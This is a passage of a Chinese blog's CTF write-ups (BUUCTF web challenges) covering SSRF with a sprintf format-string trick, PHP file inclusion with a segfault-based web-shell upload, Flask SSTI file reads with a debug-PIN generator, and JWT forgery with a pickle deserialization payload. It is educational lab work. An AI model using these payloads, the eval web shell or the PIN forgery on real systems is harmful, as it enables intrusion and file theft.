src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;section&gt;</span><br><span class="line">    &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;simform-inner&quot;&gt;</span><br><span class="line">            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;ol class&#x3D;&quot;questions&quot;&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你知道目录下都有什么文件吗?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;请输入你想检测文件内容长度的url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;li&gt;</span><br><span class="line">                    &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;你希望以何种方式访问？GET？POST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt;</span><br><span class="line">                    &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;li&gt;</span><br><span class="line">            &lt;&#x2F;ol&gt;</span><br><span class="line">            &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;controls&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;number&quot;&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">					&lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">				&lt;&#x2F;span&gt;</span><br><span class="line">                &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    var theForm &#x3D; document.getElementById( &#39;theForm&#39; );</span><br><span class="line"></span><br><span class="line">    new stepsForm( theForm, &#123;</span><br><span class="line">        onSubmit : function( form ) &#123;</span><br><span class="line">            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );</span><br><span class="line">            var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; );</span><br><span class="line">            form.submit();</span><br><span class="line">            messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;;</span><br><span class="line">            classie.addClass( messageEl, &#39;show&#39; );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filter1 &#x3D; &#39;&#x2F;^http:\&#x2F;\&#x2F;127\.0\.0\.1\&#x2F;&#x2F;i&#39;;</span><br><span class="line">$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123;</span><br><span class="line">    $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;</span><br><span class="line">    $method &#x3D; $_POST[&#39;q3&#39;];</span><br><span class="line"></span><br><span class="line">    $str1 &#x3D; &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    echo $str1;</span><br><span class="line"></span><br><span class="line">    if (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        die($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match($filter2, $url)) &#123;</span><br><span class="line">        die($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123;</span><br><span class="line">        die($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect &#x3D; @file_get_contents($url, false);</span><br><span class="line">    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>重点关注后半段PHP代码，我们可以获取到以下的限制条件：</p>
<p>1.不能包含有flag字符串</p>
<p>2.q2的值必须以<code>http://127.0.0.1/</code>开头，其实相当于是限制了只能通过SSRF读取文件</p>
<p>3.POST获取了q1、q2、q3三个值，其中q1值并没有什么限制，q2后会拼接“.y1ng.txt”字符串，q3中需要以GET或POST字符串开头。</p>
<p>首先是无法直接读取到flag文件，通过home.php文件的源码我们可以猜测应该还存在admin.php文件。其次就是我们传进去的URL即q2值会被拼接上无用字符串，我们可以通过在URL后加 “?a=(GET赋值给一个参数)” 或 “#(锚点)” 来让其失效，</p>
<p>最后一个考的点就是在这两行代码上：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br></pre></td></tr></table></figure>
<p>这里牵扯到了字符串的格式化的知识，%d会将$detect以二进制数的形式输出，所以并不能得到我们需要的源码。</p>
<p>而主要思路就是让$detect以字符串形式（%s）来输出，我们有两种读取admin.php源码的方法：</p>
<ul>
<li><code> %1$s</code> —— 这种办法原理是<code>%1$s</code>会将第一个参数用string类型输出，而这道题中第一个参数便是admin.php的源码，语句是：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect));  &#x2F;&#x2F; %1$s会以字符串格式输出$detect，而%d会输出0</span><br></pre></td></tr></table></figure>
<ul>
<li><code>%s% </code>—— 这种办法的原理是sprintf()函数中%可以转义掉%，这样语句就变成了：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect));  &#x2F;&#x2F; %d前的%被转义</span><br></pre></td></tr></table></figure>
<p>构造出Payload，POST发送给system.php即可获得<code>admin.php</code>的源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">q1&#x3D;1&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&amp;q3&#x3D;GET%1$s </span><br></pre></td></tr></table></figure>
<p><code>admin.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">&#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>] === md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] === sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;爬&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码中第一层if循环else代码块中的mt_srand随机数是真随机数，不能爆破。这里有一个Trick：</p>
<blockquote>
<p>session绕过。删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的$_SESSION[‘var’]就为NULL，相当于传参NULL。</p>
<p><a href="https://www.jianshu.com/p/9c031dee57b7">https://www.jianshu.com/p/9c031dee57b7</a></p>
</blockquote>
<p>所以只要我们在访问admin.php时，删除session访问，代码就会变成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cipher &#x3D; aesEn(&#39;&#39;, &#39;y1ng&#39;);</span><br></pre></td></tr></table></figure>
<p>因此我们就可以计算出密钥，从而获得Flag。</p>
<p>把加密算法改一下得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function aesEn($data, $key)&#123;</span><br><span class="line">    $method &#x3D; &#39;AES-128-CBC&#39;;</span><br><span class="line">    $iv &#x3D; md5(&#39;174.0.0.2&#39;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo aesEn(&#39;&#39;, &#39;y1ng&#39;)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200712125104.png" alt=""></p>
<h2 id="NPUCTF2020-ezinclude">NPUCTF2020 ezinclude</h2>
<h3 id="考点-v6">考点</h3>
<ul>
<li>文件包含</li>
<li>php Segfault</li>
</ul>
<h3 id="解题-v6">解题</h3>
<p>一进来提示 uername/password error，看的我一脸懵逼。查看网页源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></pre></td></tr></table></figure>
<p>查看cookie</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155251.png" alt=""></p>
<p>直接给了Hash值，GET参数pass=Hash值。</p>
<p>跳转到404页面，但是中间明显有一个location重定向，用bp重放。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155451.png" alt=""></p>
<p>存在文件包含漏洞，PHP伪协议读物文件</p>
<p>index.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155706.png" alt=""></p>
<p>flflflflag.php</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921155752.png" alt=""></p>
<p>查看PHP版本7.0.3，可以使用PHP Segfault上传shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">file_data = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&quot;&lt;?php eval($_POST[cmd]);&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://db4c33c0-8231-45b5-8aec-dbcadfeb8704.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url=url, files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure>
<p>flag在phpinfo中。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921160053.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——Python</title>
    <url>/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python/</url>
    <content><![CDATA[<h1 id="BUUCTF刷题——Python">BUUCTF刷题——Python</h1>
<h2 id="GYCTF2020-flaskapp">GYCTF2020 flaskapp</h2>
<h3 id="考点">考点</h3>
<ul>
<li>
<p>Flask debug pin码安全</p>
<p><a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a></p>
</li>
</ul>
<h3 id="解题">解题</h3>
<p>打开题目有一个hint界面，查看源码</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706152201.png" alt=""></p>
<p>意思应该是去伪造Flask pin然后执行命令。</p>
<p>先来验证一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[0].__init__&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160510.png" alt=""></p>
<p>然后还要找到一个读文件的payload，发现eval不能用，用open可以读</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706160627.png" alt=""></p>
<p>接下来就是要获取6个关键参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username # 用户名</span><br><span class="line"></span><br><span class="line">modname # flask.app</span><br><span class="line"></span><br><span class="line">getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;)) # Flask</span><br><span class="line"></span><br><span class="line">getattr(mod, &#39;__file__&#39;, None) # flask目录下的一个app.py的绝对路径</span><br><span class="line"></span><br><span class="line">uuid.getnode() # mac地址十进制</span><br><span class="line"></span><br><span class="line">get_machine_id() # &#x2F;etc&#x2F;machine-id</span><br></pre></td></tr></table></figure>
<p>第一个用户名可以通过<code>/etc/passwd</code>得到，即<code>flaskweb</code></p>
<p>第二个modname一般都是默认的flask.app</p>
<p>第三个也是默认的Flask</p>
<p>第四个是<code>app.py</code>的绝对路径，可以直接通过报错来获取</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161050.png" alt=""></p>
<p>第四个mac地址如果在真实环境是从<code>/etc/machine-id</code>文件读取，如果是在docker下，是从<code>/sys/class/net/eth0/address</code>目录下读取，转换成十进制<code>2485410468126</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706161305.png" alt=""></p>
<blockquote>
<p>转换地址：<a href="https://www.vultr.com/resources/mac-converter/">https://www.vultr.com/resources/mac-converter/</a></p>
</blockquote>
<p>第五个通过读取<code>/proc/self/cgroup</code>获取machine-id：1408f836b0ca514d796cbf8960e45fa1</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163205.png" alt=""></p>
<p>然后再上脚本跑出PIN码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本出处：https://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957891&#x27;</span>,<span class="comment"># address</span></span><br><span class="line">    <span class="string">&#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706162426.png" alt=""></p>
<p>system好像被禁用了，换成popen函数</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163643.png" alt=""></p>
<h2 id="RootersCTF2019-I-❤️-Flask">RootersCTF2019 I_❤️_Flask</h2>
<h2 id="CSCCTF-2019-Qual-FlaskLight">CSCCTF 2019 Qual FlaskLight</h2>
<h2 id="pasecactf-2019-flask-ssti">pasecactf_2019 flask_ssti</h2>
<h2 id="CISCN2019-华北赛区-Web2-ikun">CISCN2019 华北赛区 Web2 ikun</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>逻辑漏洞</li>
<li>JWT伪造</li>
<li>pickle反序列化</li>
</ul>
<h3 id="解题-v2">解题</h3>
<p>python脚本寻找LV6商品所在页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4186a81c-5092-4d1c-b2c3-6d753ef436c7.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;_xsrf&quot;</span>: <span class="string">&quot;2|9abd3196|175f180123b348c52281c861b9ea6ba9|1593758159&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JWT&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhMDFoIn0.xjww69DlZAtZw_26KzwvCZc&quot;</span></span><br><span class="line">           <span class="string">&quot;-WhNxACW3PuvxHlQQ2yg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;commodity_id&quot;</span>: <span class="string">&quot;2|1:0|10:1593758858|12:commodity_id|4:Nw&quot;</span></span><br><span class="line">                    <span class="string">&quot;==|42eb3fadf203ceac3f14f89b8e7a575d5350b31a29c08f6a939d099435027244 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">501</span>):</span><br><span class="line">    rq = requests.get(url=url.format(i), cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="keyword">in</span> rq.text:</span><br><span class="line">        print(url.format(i))</span><br></pre></td></tr></table></figure>
<p>跑出来的结果是<code>page=181</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703150520.png" alt=""></p>
<p>但是看到这个价格很显然是要通过某种漏洞来购买，先抓包，看到参数后想到两种办法，一是直接改价格，二是改折扣。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152451.png" alt=""></p>
<p>尝试之后发现改价格没有用，改折扣提示不是admin</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152637.png" style="zoom:50%;" />
<p>这个地方就很自然想到要越权，修改密码处没有逻辑漏洞，但是Cookie中包含JWT，放到jwt.io网址上解析后：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152814.png" alt=""></p>
<p>如果想要伪造一个admin的JWT需要知道secret。感觉这个地方就有点脑洞了，要用<a href="https://github.com/brendan-rius/c-jwt-cracker">工具</a>去爆破，我还找了很久的注入点。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152940.png" alt=""></p>
<p>再去伪造admin的JWT</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153100.png" alt=""></p>
<p>更改cookie的值</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153207.png" alt=""></p>
<p>查看个人中心，出现了一个hint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703154225.png" alt=""></p>
<p>查看源码发现源码包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153940.png" alt=""></p>
<p>题目提示了pickle，直接全局搜索，<code>Admin.py</code>有pickle反序列化漏洞</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160455.png" alt=""></p>
<p>利用脚本生成payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>
<p>将生成的payload放到隐藏的输入框里，只需将<code>hidden=&quot;hidden&quot;</code>删除即可。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160604.png" alt=""></p>
<h2 id="SUCTF-2019-Pythonginx">SUCTF 2019 Pythonginx</h2>
<h2 id="WesternCTF2018-shring">WesternCTF2018 shring</h2>
<h3 id="考点-v3">考点</h3>
<h3 id="解题-v3">解题</h3>
<p>源码</p>
